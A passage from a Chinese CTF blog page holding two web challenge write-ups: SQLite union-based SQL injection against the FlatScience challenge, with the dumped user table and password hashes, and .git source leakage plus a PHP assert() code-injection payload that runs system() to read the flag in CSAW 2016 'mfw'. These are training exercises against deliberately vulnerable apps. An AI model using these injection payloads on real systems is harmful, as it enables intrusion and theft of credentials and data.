<p>sqlite的注入：</p>
<p>使usr=admin’ or ‘1’=1发现页面跳转，cookie中有值为+admin的记录，本来想直接盲注，但发现sqlite似乎没有if function……学习一下sqlite的注入</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627">dalao</a></p>
<blockquote>
<p><strong>sqlite_master隐藏表：</strong></p>
<p>字段：type/name/tbl_name/rootpage/sql</p>
<p>type列记录了项目的类型，如table、index、view、trigger。</p>
<p>name列记录了项目的名称，如表名、索引名等。</p>
<p>tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p>
<p>rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。</p>
<p>sql列记录创建该项目的SQL语句。</p>
<p>**sqlite_version()**：版本号</p>
</blockquote>
<p>用order by 判断表有两列，换掉admin并union select 1，2可以看到cookie值变为+2，</p>
<p><img src="/images/xctf-FlatScience/image-20210317151503415.png" alt="image-20210317151503415"></p>
<p>那就不用盲注了。sqlite没有concat但有group_concat……害</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查表名：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select tbl_name from sqlite_master where type&#x3D;&#39;table&#39;)--</span><br><span class="line">查列名：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select sql from sqlite_master where type&#x3D;&#39;table&#39;)--</span><br><span class="line">查数据：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select group_concat(hint) from Users)--</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sql：</span><br><span class="line">CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</span><br><span class="line"></span><br><span class="line">id： 	  1,2,3</span><br><span class="line"></span><br><span class="line">name： 	  admin,fritze,hansi</span><br><span class="line"></span><br><span class="line">password： 3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">	       ,</span><br><span class="line">	       54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">	       ,</span><br><span class="line">	       34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line"></span><br><span class="line">hint：	  my fav word in my fav paper?!,my love is…?,the password is password</span><br></pre></td></tr></table></figure>

<p>还在打谜语……大概是paper里有一个词是密码吧……查一波，发现这还涉及到pdf转txt……</p>
<p>奈何太菜，脚本也看不懂，贴大佬链接吧：</p>
<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-705026.html">dalao2</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/harry_c/article/details/101773526">dalao3</a></p>
<p>密码是：ThinJerboa</p>
<blockquote>
<p>wohaocai，6LCc6K+t5Lq65rua5Ye65ZOl6LCt5biC==</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-04  <a class="commentCountImg" href="/2021/03/04/xctf-csaw-2016-quals-mfw/#comment-container"><span class="display-none-class">/2021/03/04/xctf-csaw-2016-quals-mfw/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="68b679c6b543e17af4f330a68919ae74">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>3 分钟  <i class="fas fa-pencil-alt"> </i>0.4 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/04/xctf-csaw-2016-quals-mfw/">xctf-csaw-2016-quals-mfw</a></h1><div class="content"><h4><span id="xctf-csaw-2016-quals-mfw">xctf-csaw-2016-quals-mfw</span></h4><h6><span id="1题目">1.题目：</span></h6><h6><span id="2过程">2.过程：</span></h6><p>打开是一个网页，点击about：</p>
<p><img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123209659.png" alt="image-20210304123209659"></p>
<p>题目提示使用了git，推测存在.git源码泄露：</p>
<p><img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123314880.png" alt="image-20210304123314880">        </p>
<p>访问发现网站目录，用GitHack获取源码：</p>
<blockquote>
<p>GitHack在python2下运行，使用方法：python2 GitHack.py [指定url]</p>
</blockquote>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123716586.png" alt="image-20210304123716586" style="zoom:90%;">

<p>index.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>涉及到了assert的知识点：</p>
<blockquote>
<p>assert — 检查一个断言是否为 FALSE</p>
<p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
<p>如本题：assert(“strpos(‘$file’, ‘..’) === false”) 执行了strpos函数对file进行了检查，若没有检查到..，则继续运行；若检查到，则抛出warning并die(“Detected hacking attempt!”)。</p>
</blockquote>
<p>重点是对于assert函数的利用，控制file使之执行指定的代码。</p>
<p>eg：?page=’) or eval(“echo 9*9;”);//</p>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304134649985.png" alt="image-20210304134649985" style="zoom:80%;">

<p>不是很懂为什么会输出Detected hacking attempt!，本地尝试：</p>
<p>?page=’) or eval(“print(8*9);”);//</p>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304141243600.png" alt="image-20210304141243600" style="zoom:80%;">

<p>抑制住了疯狂报错……输出了bool（false），大概是语法或是什么地方出了一点问题……就挺迷的……</p>
<p>?page=’) or system(“cat templates/flag.php”);//</p>
<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304135359125.png" alt="image-20210304135359125" style="zoom:80%;">

<p>得到flag</p>
<p>关于or可用点号替换的推测：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/alsf/p/9618070.html">深入解析PHP中逗号与点号的区别</a></p>
<blockquote>
<p>……</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/5/">上一页</a></div><div class="pagination-next"><a href="/page/7/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><a class="pagination-link is-current" href="/page/6/">6</a></li><li><a class="pagination-link" href="/page/7/">7</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/11/">11</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/header.jpg" alt="inanb"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">inanb</p><p class="is-size-6 is-block">铁马冰河入梦来</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">108</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/inanb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/inanb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T09:42:32.238Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/b01lers2020-Life_on_Mars/">b01lers2020-Life_on_Mars</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T03:15:58.421Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/ISITDTU-2019-EasyPHP/">ISITDTU-2019-EasyPHP</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-31T12:37:17.632Z">2021-08-31</time></p><p class="title"><a href="/2021/08/31/SUCTF-2018-GetShell/">SUCTF-2018-GetShell</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-31T03:42:12.897Z">2021-08-31</time></p><p class="title"><a href="/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/">红明谷CTF-2021-write_shell</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-28T02:53:12.240Z">2021-08-28</time></p><p class="title"><a href="/2021/08/28/MRCTF2020-Ezaudit/">MRCTF2020-Ezaudit</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/LeetCode/"><span class="level-start"><span class="level-item">LeetCode</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"><span class="level-start"><span class="level-item">学习报告</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/buuctf/"><span class="tag">buuctf</span><span class="tag is-grey-lightest">16</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf/"><span class="tag">Buuctf</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><span class="tag">php变量覆盖</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><span class="tag">伪协议</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">Buuctf PHP代码审计 文件包含</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-SQL/"><span class="tag">Buuctf SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Html%E5%92%8Ccss/"><span class="tag">Html和css</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a><p class="size-small"><span>&copy; 2021 inanb</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2165337463" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>